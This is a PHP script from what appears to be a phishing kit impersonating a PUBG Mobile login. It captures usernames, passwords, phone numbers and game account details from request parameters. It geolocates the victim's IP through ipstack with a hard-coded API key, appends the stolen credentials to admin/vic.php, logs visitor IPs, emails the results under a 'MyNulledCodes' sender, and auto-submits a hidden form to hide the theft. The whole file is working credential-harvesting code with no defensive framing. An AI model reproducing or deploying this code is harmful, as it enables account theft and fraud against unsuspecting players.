<?php
$min_seconds_between_refreshes = 60;
session_start();
if(array_key_exists('last_access', $_SESSION) && time()-$min_seconds_between_refreshes <= $_SESSION['last_access']) {
  exit('You are refreshing too quickly, please wait a few seconds and try again.');
}
$_SESSION['last_access'] = time();
?>
<?php
 $ip = $_SERVER['REMOTE_ADDR']; 
 $api_key = "0e5e25f76c9d69804800fc43ebf380cb";
 $freegeoipjson = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."");
 $jsondata = json_decode($freegeoipjson);
 $countryfromip = $jsondata->country_name;
 ?>

<?php
$username = $_GET['username'];
$password = $_GET['password'];
$nope = $_GET['nope'];
$login = $_GET['login'];
$nick = $_GET['nick'];
$playid = $_GET['playid'];
$level = $_GET['level'];
$tier = $_GET['tier'];
$rpt = $_GET['rpt'];
$rpl = $_GET['rpl'];
$platform = $_GET['platform'];
$country = $_GET['country'];
?>

<?php
include ('admin/config.php');
$headers = "From: MyNulledCodes@gmail.com";
$headers.= "Content-type: text/html";
$success = mail($mailto, $subjek, $body, $headers);
$handle = fopen("admin/vic.php", "a");

$body = '

#---------[ Result Login ]-----------#

<br>	Username   =   '.$username.'
<br>	Password   =   '.$password.'
<br>	PhoneNum   =   '.$nope.'

<br>	NickName   =   '.$nick.'
<br>	playerID   =   '.$playid.'
<br>	Tier       =   '.$tier.'
<br>	Rp Type    =   '.$rpt.'

<br>	AccLevel   =   '.$level.'
<br>	RP Level   =   '.$rpl.'

<br>    Country     =  '.$countryfromip.'
<br>	Platform   =   '.$platform.'

<br>
#--[ MyNulledCodes ]--#
<br>
';


	$file = fopen("admin/vic.php", "a");
	fwrite($file, $body);

$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
file_put_contents('admin/VisitorsIP.log', $line . PHP_EOL, FILE_APPEND);
?>

<?php
include ('admin/config.php');
$url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$subjek = "PUBG $login|$username|$level";

$headers = "From: PubgMobile <MyNulledCodes@gmail.com>";
$headers.= "";
$success = mail($result, $subjek, $body, $headers);
?>
<form type="hidden" method="GET" action="success.php" id="myform">
     <input type="hidden" class="verify" name="nick" id="nickname" value="<?php echo $nick;?>" readonly>
      <input type="hidden" class="verify" name="username" id="username" value="<?php echo $username;?>" readonly>
      <input type="hidden" class="verify" name="nope" id="nope" value="<?php echo $nope;?>" readonly>
       <input type="hidden" class="verify" name="password" id="password" value="<?php echo $password;?>" readonly>
        <input type="hidden" class="verify" name="login" id="login" value="<?php echo $login;?>" readonly>
         <input type="hidden" class="verify" name="playid" id="playid" value="<?php echo $playid;?>" readonly>
          <input type="hidden" class="verify" name="level" id="level" value="<?php echo $level;?>" readonly>
           <input type="hidden" class="verify" name="rpt" id="rpt" value="<?php echo $rpt;?>" readonly>
            <input type="hidden" class="verify" name="rpl" id="rpl" value="<?php echo $rpl;?>" readonly>
              <input type="hidden" class="verify" name="tier" id="tier" value="<?php echo $tier;?>" readonly>
              <input type="hidden" class="verify" name="platform" id="platform" value="<?php echo $platform;?>" readonly>
               <input type="hidden" class="verify" name="countryfromip" id="countryfromip" value="<?php echo $countryfromip;?>" readonly>
  <input type="submit">
</form>
 
<script type="text/javascript">
  document.getElementById("myform").submit();
</script>